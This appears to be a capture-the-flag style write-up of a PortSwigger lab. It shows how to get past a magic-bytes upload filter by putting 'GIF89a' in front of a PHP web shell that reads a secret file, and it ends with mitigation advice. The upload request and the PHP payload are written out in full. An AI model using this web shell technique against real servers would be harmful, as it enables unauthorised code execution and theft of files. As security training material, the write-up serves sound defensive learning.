

**Lab:** Web shell upload bypassing file content inspection (PortSwigger)

**Objective:** Bypass the server's file content validation (magic bytes verification) to upload a PHP web shell and exfiltrate the contents of `/home/carlos/secret`.

**Methodology:** Magic Bytes Spoofing (GIF) + Web Shell Execution

## The Vulnerability

The web application attempts to secure the file upload function by verifying the actual content of the uploaded file, rather than just trusting the `Content-Type` header or the file extension. 

It does this by checking the "magic bytes" (the file signature) at the very beginning of the file to ensure it matches a known image format like JPEG or GIF.

However, the validation is inherently flawed because it only checks the first few bytes. An attacker can easily spoof a valid image signature (e.g., `GIF89a`) at the beginning of a malicious PHP file. 

The server sees the valid signature, accepts the file, and saves it. If the file is saved with a `.php` extension, the Apache server will execute the PHP code appended after the spoofed signature.

## Exploitation Steps

### Step 1: Intercept the Upload Request

1. Log in to the application using the provided credentials (`wiener:peter`).

2. Navigate to the **My Account** page.

3. Turn on **Intercept** in Burp Suite Proxy.

4. On the browser, select any file and click **Upload**.

### Step 2: Spoof the Magic Bytes

Once Burp Suite intercepts the `POST /my-account/avatar` request, we need to modify both the filename and the file content.

Change the `filename` parameter in the `Content-Disposition` header to `shell.php`.

Clear the original file content in the body and replace it with a spoofed GIF signature followed immediately by the PHP payload. 

The modified payload section should look exactly like this:

```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

GIF89a
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Send the request. The server's content inspection filter reads the GIF89a header, incorrectly assumes the file is a valid GIF image, and responds with 200 OK.

Step 3: Execute the Payload
Open a browser or use a GET request in Burp Suite to navigate directly to the uploaded PHP file:
```
https://[YOUR-LAB-ID].web-security-academy.net/files/avatars/shell.php
```
The Apache server executes the .php file. It outputs the GIF89a string as plain text, and then executes the PHP code, appending the secret string right after it.

The response will look similar to this:
```
GIF89aGPY5fkd0LG7gr5wS2LI9NMoUDsGnMamd
```
Carefully copy only the secret string (excluding the GIF89a prefix) and submit it on the lab's main page to solve the challenge.

Mitigation
Relying solely on magic bytes to verify file types is insufficient. To properly secure file uploads, developers should implement a multi-layered defense:

Validate the file extension against a strict whitelist.

Ensure that the directory where uploaded files are stored does not have execution permissions (e.g., configuring Apache to not execute .php files in the /avatars/ directory).

Use an established image processing library to re-encode or strip metadata/appended data from uploaded images, which will destroy any injected PHP payloads.
<img width="858" height="504" alt="image" src="https://github.com/user-attachments/assets/6b11543a-c76d-40c3-8325-fe50b1a5d3d5" />
